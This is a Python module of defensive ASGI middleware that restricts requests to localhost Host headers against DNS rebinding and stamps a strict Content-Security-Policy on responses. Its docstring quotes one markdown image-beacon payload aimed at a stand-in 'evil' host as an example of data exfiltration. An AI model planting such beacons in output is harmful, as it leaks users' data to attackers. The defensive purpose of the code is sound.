"""ASGI security middleware for the local web server.

Two small pure-ASGI middlewares (no starlette middleware base classes needed):

- :class:`HostAllowlistMiddleware` rejects any request whose ``Host`` header
  hostname is not local. This is the defense against DNS rebinding, which
  would otherwise give hostile websites same-origin access to trigger paid
  LLM runs and read results. The check is port-agnostic (Docker remaps ports
  but forwards the Host header verbatim).
- :class:`SecurityHeadersMiddleware` stamps a strict Content-Security-Policy
  on every response. ``img-src 'self' data:`` is the critical directive:
  report markdown derives from attacker-influenceable scraped content, and
  image-beacon exfiltration (``![](https://evil/?leak=...)``) is not blocked
  by DOMPurify — only CSP stops it. It also sets ``Cache-Control: no-cache``
  where absent (Starlette's static files send no cache-control, and stale
  module caching breaks the app after pip upgrades).
"""

from __future__ import annotations

ALLOWED_HOSTNAMES = frozenset({"localhost", "127.0.0.1", "::1"})

CSP_POLICY = (
    "default-src 'none'; script-src 'self'; style-src 'self'; "
    "img-src 'self' data:; connect-src 'self'"
)


def host_header_hostname(host: str) -> str:
    """Extract the hostname from a ``Host`` header value, dropping any port.

    Handles ``example.com``, ``example.com:8035``, ``[::1]:8035``, and a bare
    unbracketed IPv6 literal (multiple colons -> the whole value is the host).
    """
    host = host.strip().lower()
    if host.startswith("["):
        end = host.find("]")
        return host[1:end] if end != -1 else ""
    if host.count(":") == 1:
        return host.split(":", 1)[0]
    return host


class HostAllowlistMiddleware:
    def __init__(self, app, allowed_hostnames: frozenset[str] = ALLOWED_HOSTNAMES):
        self.app = app
        self.allowed_hostnames = allowed_hostnames

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        host = ""
        for name, value in scope.get("headers", []):
            if name == b"host":
                host = value.decode("latin-1")
                break

        if host_header_hostname(host) not in self.allowed_hostnames:
            body = b"Invalid Host header"
            await send({
                "type": "http.response.start",
                "status": 400,
                "headers": [
                    (b"content-type", b"text/plain; charset=utf-8"),
                    (b"content-length", str(len(body)).encode()),
                ],
            })
            await send({"type": "http.response.body", "body": body})
            return

        await self.app(scope, receive, send)


class SecurityHeadersMiddleware:
    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        async def send_with_headers(message):
            if message["type"] == "http.response.start":
                headers = list(message.get("headers", []))
                names = {name.lower() for name, _ in headers}
                headers.append((b"content-security-policy", CSP_POLICY.encode()))
                if b"x-content-type-options" not in names:
                    headers.append((b"x-content-type-options", b"nosniff"))
                if b"cache-control" not in names:
                    headers.append((b"cache-control", b"no-cache"))
                message = {**message, "headers": headers}
            await send(message)

        await self.app(scope, receive, send_with_headers)
